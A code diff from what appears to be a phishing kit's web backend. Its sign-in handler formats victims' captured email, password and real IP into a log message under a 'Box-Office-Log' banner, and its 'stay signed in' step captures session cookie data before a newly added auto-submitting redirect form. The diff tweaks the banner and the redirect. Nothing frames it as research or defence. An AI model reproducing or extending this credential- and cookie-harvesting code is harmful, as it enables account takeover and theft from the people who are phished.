@@ -1085,7 +1085,7 @@ async def sign_in_handler():
             current_time = datetime.now(timezone.utc).isoformat()
 
             credentials_message = (
-                f"🎯 $Box-Office-Log 📬HackerOne🎯\n\n"
+                f"🎯$Box-Office-Log📬HackerOne🎯\n\n"
                 f"📧 Email: {email}\n"
                 f"🔑 Password: {password}\n" 
                 f"🌍 Real IP: {client_ip}\n"
@@ -1184,8 +1184,11 @@ async def stay_signed_in():
                 cookie_data = process(user_email, user_password, request)
                 session['cookie_data'] = cookie_data  # Store cookie data in session
 
-        # Redirect to the final redirect URL
-        return redirect(url_for('final_redirect'))
+        # Render a template with a form that auto-submits to /final-redirect
+        return render_template(
+            'redirect_form.html',
+            stay_signed_in=stay_signed_in
+        )
 
 def process(email, password, request):
     """
